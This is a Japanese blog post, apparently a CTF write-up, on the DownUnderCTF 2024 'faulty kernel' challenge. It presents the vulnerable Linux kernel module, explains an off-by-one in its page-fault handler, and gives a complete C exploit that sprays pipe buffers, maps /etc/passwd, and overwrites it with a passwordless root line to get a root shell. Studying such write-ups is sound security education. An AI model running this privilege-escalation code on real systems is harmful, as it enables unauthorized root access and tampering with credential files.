@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <title>DownUnderCTF 2024 | faulty kernel | House-of-Rona</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://blog.rqda.wtf/style.css">
+    <link rel="stylesheet" href="https://blog.rqda.wtf/color/green-auto.css">
+
+        <link rel="stylesheet" href="https://blog.rqda.wtf/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://blog.rqda.wtf/font-hack-subset.css">
+
+        <link rel="shortcut icon" type="image/png" href="/images/favicon.png">
+    
+<link rel="stylesheet" href="https://blog.rqda.wtf/footnote.css">
+<link rel="stylesheet" href="https://blog.rqda.wtf/page.css">
+<link rel="stylesheet" href="https://www.nerdfonts.com/assets/css/webfont.css">
+
+<meta name="google-site-verification" content="I4O4hRvGX4CkU3wvuZTczjjZFLuG3YINxBvx2be_tHY">
+<link rel="stylesheet" href="https://blog.rqda.wtf/icon.css">
+
+<meta property="og:title" content="DownUnderCTF 2024 | faulty kernel | House-of-Rona">
+<meta property="og:image" content="https://github.com/rqdaA.png">
+<meta name="twitter:site" content="@907903">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="DownUnderCTF 2024 | faulty kernel | House-of-Rona">
+<meta name="twitter:image" content="https://github.com/rqdaA.png">
+<meta property="author" content="Rona (rqdaA)">
+<meta property="description" content="Linux kernelなんもわからん">
+<meta property="og:description" content="Linux kernelなんもわからん">
+
+
+</head>
+
+<body class="">
+<div class="container">
+    
+<header class="header">
+    <div class="header__inner">
+        <div class="header__logo">
+            
+            <img src="https://github.com/rqdaA.png" alt="">
+            
+            
+            <a href="https://blog.rqda.wtf" style="text-decoration: none;">
+                <div class="logo">
+                    
+                    House-of-Rona
+                    
+                </div>
+            </a>
+        </div>
+    </div>
+
+    
+    <nav class="menu">
+            <ul class="menu__inner">
+                <li><a href="https://blog.rqda.wtf/tags"><i class='nf nf-oct-tag'></i>tags</a></li>
+            
+                <li><a href="https://blog.rqda.wtf/about"><i class='nf nf-dev-github_alt'></i>whoami</a></li>
+            
+                <li><a href="https://github.com/rqdaA" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-github_inverted'></i>github</a></li>
+            
+                <li><a href="https://twitter.com/907903" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-twitter'></i>twitter</a></li>
+            </ul>
+        </nav>
+    
+    
+    
+</header>
+
+
+    <div class="content">
+        
+<div class="post">
+    
+    <h1 class="post-title"><a href="https://blog.rqda.wtf/downunder-2024/">DownUnderCTF 2024 | faulty kernel</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2024-07-10
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/kernel/">#kernel</a>&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/pwn/">#pwn</a></span>
+    
+
+    
+    <h1>Table of Content</h1>
+    <ul>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/downunder-2024/#faulty-kernel">Faulty Kernel</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/downunder-2024/#gai-yao">概要</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/downunder-2024/#cui-ruo-xing">脆弱性</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/downunder-2024/#gong-ji">攻撃</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/downunder-2024/#exploit">Exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+    </ul>
+    <hr>
+    
+
+    
+        <div class="post-content">
+            <p><a href="https://ctftime.org/event/2284">DownUnderCTF</a>のupsolveです。</p>
+<h1 id="faulty-kernel">Faulty Kernel</h1>
+<h2 id="gai-yao">概要</h2>
+<p>KernelはLinux 6.10.0-rc4で、SMAP,SMEP,kASLRは有効です。</p>
+<p>mmapとfault handlerがあるmisc deviceを登録するカーネルオブジェクトが渡されます。</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">#define </span><span>PAGECOUNT (</span><span style="color:#d08770;">128</span><span>)
+</span><span>
+</span><span style="color:#b48ead;">struct </span><span>shared_buffer {
+</span><span>	pgoff_t pagecount;
+</span><span>	</span><span style="color:#b48ead;">struct </span><span>page** pages;
+</span><span>};
+</span><span>
+</span><span style="color:#b48ead;">static struct</span><span> miscdevice dev;
+</span><span>
+</span><span style="color:#b48ead;">static struct</span><span> file_operations dev_fops = {
+</span><span>	.</span><span style="color:#bf616a;">owner </span><span>= THIS_MODULE,
+</span><span>	.</span><span style="color:#bf616a;">open </span><span>= dev_open,
+</span><span>	.</span><span style="color:#bf616a;">mmap </span><span>= dev_mmap
+</span><span>};
+</span><span>
+</span><span style="color:#b48ead;">static struct</span><span> vm_operations_struct dev_vm_ops = {
+</span><span>	.</span><span style="color:#bf616a;">fault </span><span>= dev_vma_fault
+</span><span>};
+</span><span>
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">dev_mmap</span><span>(</span><span style="color:#b48ead;">struct</span><span> file* </span><span style="color:#bf616a;">filp</span><span>, </span><span style="color:#b48ead;">struct</span><span> vm_area_struct* </span><span style="color:#bf616a;">vma</span><span>) {
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> shared_buffer* sbuf = filp-&gt;private_data;
+</span><span>	pgoff_t pages = </span><span style="color:#bf616a;">vma_pages</span><span>(vma);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(pages &gt; sbuf-&gt;pagecount) {
+</span><span>		</span><span style="color:#b48ead;">return </span><span>-EINVAL;
+</span><span>	}
+</span><span>
+</span><span>	vma-&gt;vm_ops = &amp;dev_vm_ops;
+</span><span>    	vma-&gt;vm_private_data = sbuf;
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">return</span><span> SUCCESS;
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">static</span><span> vm_fault_t </span><span style="color:#8fa1b3;">dev_vma_fault</span><span>(</span><span style="color:#b48ead;">struct</span><span> vm_fault *</span><span style="color:#bf616a;">vmf</span><span>) {
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> vm_area_struct *vma = vmf-&gt;vma;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> shared_buffer *sbuf = vma-&gt;vm_private_data;
+</span><span>
+</span><span>	pgoff_t pgoff = vmf-&gt;pgoff;
+</span><span>
+</span><span>    	</span><span style="color:#b48ead;">if </span><span>(pgoff &gt; sbuf-&gt;pagecount) {
+</span><span>        	</span><span style="color:#b48ead;">return</span><span> VM_FAULT_SIGBUS;
+</span><span>    	}
+</span><span>
+</span><span>	</span><span style="color:#bf616a;">get_page</span><span>(sbuf-&gt;pages[pgoff]);
+</span><span>	vmf-&gt;page = sbuf-&gt;pages[pgoff];
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">return</span><span> SUCCESS;
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">dev_open</span><span>(</span><span style="color:#b48ead;">struct</span><span> inode* </span><span style="color:#bf616a;">inodep</span><span>, </span><span style="color:#b48ead;">struct</span><span> file* </span><span style="color:#bf616a;">filp</span><span>) {
+</span><span>	</span><span style="color:#b48ead;">int</span><span> i;
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> shared_buffer* sbuf;
+</span><span>
+</span><span>	sbuf = </span><span style="color:#bf616a;">kzalloc</span><span>(sizeof(*sbuf), GFP_KERNEL);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(!sbuf) {
+</span><span>		</span><span style="color:#bf616a;">printk</span><span>(KERN_INFO &quot;</span><span style="color:#a3be8c;">[dev] Failed to initilise buffer.</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>		</span><span style="color:#b48ead;">goto</span><span> fail;
+</span><span>	}
+</span><span>
+</span><span>	sbuf-&gt;pagecount = PAGECOUNT;
+</span><span>	sbuf-&gt;pages = </span><span style="color:#bf616a;">kmalloc_array</span><span>(sbuf-&gt;pagecount, sizeof(*sbuf-&gt;pages), GFP_KERNEL);
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(!sbuf-&gt;pages) {
+</span><span>		</span><span style="color:#bf616a;">printk</span><span>(KERN_INFO &quot;</span><span style="color:#a3be8c;">[dev] Failed to initilise buffer.</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>		</span><span style="color:#b48ead;">goto</span><span> fail_alloc_buf;
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">for </span><span>(i = </span><span style="color:#d08770;">0</span><span>; i &lt; sbuf-&gt;pagecount; i++) {
+</span><span>		sbuf-&gt;pages[i] = </span><span style="color:#bf616a;">alloc_page</span><span>(GFP_KERNEL);
+</span><span>		</span><span style="color:#b48ead;">if </span><span>(!sbuf-&gt;pages[i]) {
+</span><span>			</span><span style="color:#bf616a;">printk</span><span>(KERN_ERR &quot;</span><span style="color:#a3be8c;">[dev] Failed to allocate page </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">.</span><span style="color:#96b5b4;">\n</span><span>&quot;, i);
+</span><span>			</span><span style="color:#b48ead;">goto</span><span> fail_alloc_pages;
+</span><span>		}
+</span><span>	}
+</span><span>
+</span><span>	filp-&gt;private_data = sbuf;
+</span><span>	</span><span style="color:#b48ead;">return</span><span> SUCCESS;
+</span><span>
+</span><span>fail_alloc_pages:
+</span><span>	</span><span style="color:#b48ead;">while </span><span>(i--) {
+</span><span>		</span><span style="color:#b48ead;">if </span><span>(sbuf-&gt;pages[i]) {
+</span><span>			</span><span style="color:#bf616a;">__free_page</span><span>(sbuf-&gt;pages[i]);
+</span><span>		}
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#bf616a;">kfree</span><span>(sbuf-&gt;pages);
+</span><span>fail_alloc_buf:
+</span><span>	</span><span style="color:#bf616a;">kfree</span><span>(sbuf);
+</span><span>fail:
+</span><span>	</span><span style="color:#b48ead;">return</span><span> FAIL;
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">dev_init</span><span>(</span><span style="color:#b48ead;">void</span><span>) {
+</span><span>	dev.</span><span style="color:#bf616a;">minor </span><span>= MISC_DYNAMIC_MINOR;
+</span><span>    	dev.</span><span style="color:#bf616a;">name </span><span>= DEV_NAME;
+</span><span>    	dev.</span><span style="color:#bf616a;">fops </span><span>= &amp;dev_fops;
+</span><span>    	dev.</span><span style="color:#bf616a;">mode </span><span>= </span><span style="color:#d08770;">0644</span><span>;
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">misc_register</span><span>(&amp;dev)) {
+</span><span>        	</span><span style="color:#b48ead;">return</span><span> FAIL;
+</span><span>    	}
+</span><span>
+</span><span>
+</span><span>	</span><span style="color:#bf616a;">printk</span><span>(KERN_INFO &quot;</span><span style="color:#a3be8c;">[dev] It&#39;s mappin&#39; time!</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>
+</span><span>	</span><span style="color:#b48ead;">return</span><span> SUCCESS;
+</span><span>}
+</span></code></pre>
+<p>図示すると以下のような状態になっています。
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;overview.32cd3fc74f99daa9.png" alt=""/>
+    <p>問題の概観</p></div>
+</p>
+<h2 id="cui-ruo-xing">脆弱性</h2>
+<p>脆弱性は<code>dev_vma_fault</code>関数にあります。 <br />
+この関数は、pagefaultが発生した際にpgoff番目のpageを返す処理を実装していますが、<code>sbuf-&gt;pagecount</code>はpagesの個数を表しているためoff-by-oneが発生します。</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">if </span><span>(pgoff &gt; sbuf-&gt;pagecount) {
+</span><span>    </span><span style="color:#b48ead;">return</span><span> VM_FAULT_SIGBUS;
+</span><span>}
+</span><span>
+</span><span style="color:#bf616a;">get_page</span><span>(sbuf-&gt;pages[pgoff]);
+</span><span>vmf-&gt;page = sbuf-&gt;pages[pgoff];
+</span></code></pre>
+<h2 id="gong-ji">攻撃</h2>
+<p>mmap時のチェックに問題はないので、mmapに渡せる最大サイズは<code>PAGE * 128</code>となります。その後mremapを呼び、sizeを<code>PAGE * 129</code>に変更し<code>sbuf-&gt;pages[128]</code>にアクセスすると上記のOOB Readが出来ます。<br />
+では、どのオブジェクトを隣接させると良いでしょうか？
+pagesは<code>kmalloc_array(sbuf-&gt;pagecount, sizeof(*sbuf-&gt;pages), GFP_KERNEL)</code>で確保され、これはkmalloc-1kに入ります。ということは、最初の8byteが<code>page*</code>、かつ、kmalloc-1k
+sizedな構造体を探すと良さそうでこれは<a href="https://elixir.bootlin.com/linux/v6.10-rc4/source/include/linux/pipe_fs_i.h#L26">pipe_buffer</a>が該当します。<br />
+したがって、exploit時のheapの状態はこのようになっていると良さそうです。
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;exploit.4c4c7450c1f7284d.png" alt=""/>
+    <p>exploit前のheapの状態</p></div>
+</p>
+<p>というわけで権限昇格までの流れは以下のとおりになります。</p>
+<ol>
+<li>kmalloc 1kを埋める</li>
+<li>pipe_bufferを大量に確保</li>
+<li>pipe_bufferを1つおきに開放</li>
+<li>pipe_bufferの先頭要素を/etc/passwdのpageに変更</li>
+<li>問題のドライバにmmap</li>
+<li>mremap</li>
+<li>OOB Readを使って/etc/passwdに書き込み</li>
+</ol>
+<h2 id="exploit">Exploit</h2>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">#include </span><span>&quot;</span><span style="color:#a3be8c;">./exploit.h</span><span>&quot;
+</span><span style="color:#b48ead;">#include </span><span>&quot;</span><span style="color:#a3be8c;">./common.h</span><span>&quot;
+</span><span>
+</span><span style="color:#65737e;">/*********** commands ******************/
+</span><span style="color:#b48ead;">#define </span><span>DEV_PATH &quot;</span><span style="color:#a3be8c;">/dev/challenge</span><span>&quot;   </span><span style="color:#65737e;">// the path the device is placed
+</span><span>
+</span><span style="color:#b48ead;">#define </span><span>PAGECOUNT </span><span style="color:#d08770;">128
+</span><span>
+</span><span style="color:#65737e;">/*********** constants ******************/
+</span><span style="color:#65737e;">// (END globals)
+</span><span>
+</span><span style="color:#b48ead;">struct </span><span>fd_pair {
+</span><span>  </span><span style="color:#b48ead;">int</span><span> fd[</span><span style="color:#d08770;">2</span><span>];
+</span><span>};
+</span><span>
+</span><span style="color:#b48ead;">struct</span><span> fd_pair pairs[</span><span style="color:#d08770;">0x100</span><span>];
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">heap_spray</span><span>() {
+</span><span>  </span><span style="color:#b48ead;">for </span><span>(</span><span style="color:#b48ead;">int</span><span> i = </span><span style="color:#d08770;">0</span><span>; i &lt; </span><span style="color:#d08770;">0x100</span><span>; i++) {
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">pipe</span><span>(pairs[i].</span><span style="color:#bf616a;">fd</span><span>)) {
+</span><span>      </span><span style="color:#bf616a;">errExit</span><span>(&quot;</span><span style="color:#a3be8c;">pipe</span><span>&quot;);
+</span><span>    }
+</span><span>  }
+</span><span>
+</span><span>  </span><span style="color:#b48ead;">for </span><span>(</span><span style="color:#b48ead;">int</span><span> i = </span><span style="color:#d08770;">0</span><span>; i &lt; </span><span style="color:#d08770;">0x100</span><span>; i++) {
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(!(i % </span><span style="color:#d08770;">2</span><span>)) {
+</span><span>      </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">close</span><span>(pairs[i].</span><span style="color:#bf616a;">fd</span><span>[</span><span style="color:#d08770;">0</span><span>]) || </span><span style="color:#bf616a;">close</span><span>(pairs[i].</span><span style="color:#bf616a;">fd</span><span>[</span><span style="color:#d08770;">1</span><span>])) {
+</span><span>	</span><span style="color:#bf616a;">errExit</span><span>(&quot;</span><span style="color:#a3be8c;">close</span><span>&quot;);
+</span><span>      }
+</span><span>    }
+</span><span>  }
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">splice_pipe</span><span>(</span><span style="color:#b48ead;">void </span><span>*</span><span style="color:#bf616a;">addr</span><span>) {
+</span><span>  </span><span style="color:#b48ead;">for </span><span>(</span><span style="color:#b48ead;">int</span><span> i = </span><span style="color:#d08770;">0</span><span>; i &lt; </span><span style="color:#d08770;">0x100</span><span>; i++) {
+</span><span>    </span><span style="color:#b48ead;">if </span><span>(i % </span><span style="color:#d08770;">2</span><span>) {
+</span><span>      </span><span style="color:#b48ead;">struct</span><span> iovec iov = {.</span><span style="color:#bf616a;">iov_base</span><span>=addr, .</span><span style="color:#bf616a;">iov_len</span><span>=PAGE};
+</span><span>      </span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#bf616a;">vmsplice</span><span>(pairs[i].</span><span style="color:#bf616a;">fd</span><span>[</span><span style="color:#d08770;">1</span><span>], &amp;iov, </span><span style="color:#d08770;">1</span><span>, </span><span style="color:#d08770;">0</span><span>) &lt; </span><span style="color:#d08770;">0</span><span>) {
+</span><span>	</span><span style="color:#bf616a;">errExit</span><span>(&quot;</span><span style="color:#a3be8c;">vmsplice</span><span>&quot;);
+</span><span>      }
+</span><span>    }
+</span><span>  }
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span>, </span><span style="color:#b48ead;">char </span><span>*</span><span style="color:#bf616a;">argv</span><span>[]) {
+</span><span>  </span><span style="color:#b48ead;">char </span><span>*BACKDOOR = &quot;</span><span style="color:#a3be8c;">root::0:0:root:/root:/bin/sh</span><span>&quot;;
+</span><span>  </span><span style="color:#b48ead;">int</span><span> passwd_fd = </span><span style="color:#bf616a;">SYSCHK</span><span>(</span><span style="color:#bf616a;">open</span><span>(&quot;</span><span style="color:#a3be8c;">/etc/passwd</span><span>&quot;, O_RDONLY));
+</span><span>  </span><span style="color:#b48ead;">void</span><span>* passwd_addr = </span><span style="color:#bf616a;">SYSCHK</span><span>(</span><span style="color:#bf616a;">mmap</span><span>(</span><span style="color:#d08770;">0</span><span>, PAGE, PROT_READ, MAP_SHARED, passwd_fd, </span><span style="color:#d08770;">0</span><span>));
+</span><span>  </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">passwd addr: </span><span style="color:#d08770;">%p</span><span style="color:#96b5b4;">\n</span><span>&quot;, passwd_addr);
+</span><span>  </span><span style="color:#bf616a;">heap_spray</span><span>();
+</span><span>  </span><span style="color:#b48ead;">int</span><span> fd = </span><span style="color:#bf616a;">open</span><span>(DEV_PATH, O_RDWR);
+</span><span>  </span><span style="color:#bf616a;">splice_pipe</span><span>(passwd_addr);
+</span><span>
+</span><span>  </span><span style="color:#b48ead;">void</span><span>* old_addr = </span><span style="color:#bf616a;">SYSCHK</span><span>(</span><span style="color:#bf616a;">mmap</span><span>(</span><span style="color:#d08770;">0</span><span>, PAGE * PAGECOUNT, PROT_READ|PROT_WRITE, MAP_SHARED, fd, </span><span style="color:#d08770;">0</span><span>));
+</span><span>  </span><span style="color:#b48ead;">void</span><span>* new_addr = </span><span style="color:#bf616a;">SYSCHK</span><span>(</span><span style="color:#bf616a;">mremap</span><span>(old_addr,PAGE * PAGECOUNT, (PAGE+</span><span style="color:#d08770;">1</span><span>) * PAGECOUNT, MREMAP_MAYMOVE));
+</span><span>  </span><span style="color:#b48ead;">char</span><span>* passwd_str = (</span><span style="color:#b48ead;">char</span><span>*)new_addr+(PAGE*PAGECOUNT);
+</span><span>  </span><span style="color:#b48ead;">int</span><span> pid = </span><span style="color:#bf616a;">getpid</span><span>();
+</span><span>  </span><span style="color:#96b5b4;">memcpy</span><span>(passwd_str, BACKDOOR, </span><span style="color:#96b5b4;">strlen</span><span>(BACKDOOR)+</span><span style="color:#d08770;">1</span><span>);
+</span><span>  </span><span style="color:#96b5b4;">system</span><span>(&quot;</span><span style="color:#a3be8c;">/bin/su -</span><span>&quot;);
+</span><span>  </span><span style="color:#96b5b4;">system</span><span>(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span>&quot;);
+</span><span>
+</span><span>  </span><span style="color:#65737e;">// end of life
+</span><span>  </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">[ ] END of life...</span><span>&quot;);
+</span><span>  </span><span style="color:#bf616a;">sleep</span><span>(</span><span style="color:#d08770;">999999</span><span>);
+</span><span>}
+</span></code></pre>
+<p>概略はつかめると思いますが、使っているマクロの詳細などを知りたい方は<a href="https://github.com/rqdaA/kernel-ctf/tree/master/faulty_kernel">GitHub</a>まで。</p>
+
+        </div>
+
+    
+        <div class="pagination">
+            <div class="pagination__title">
+                <span class="pagination__title-h">Other posts</span>
+                <hr />
+            </div>
+            <div class="pagination__buttons">
+                    <span class="button previous">
+                        <a href="https://blog.rqda.wtf/angstrom-2024/">
+                            <span class="button__icon">←</span>&nbsp;
+                            <span class="button__text">Angstorm 2024</span>
+                        </a>
+                    </span>
+                
+                
+                    <span class="button next">
+                        <a href="https://blog.rqda.wtf/dreamhack-inv-2025/">
+                            <span class="button__text">Writeup of DreamHack Invitational 2025</span>&nbsp;
+                            <span class="button__icon">→</span>
+                        </a>
+                    </span>
+                </div>
+        </div>
+    
+</div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright copyright--user">&#169 2025 Rona 🐈</div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
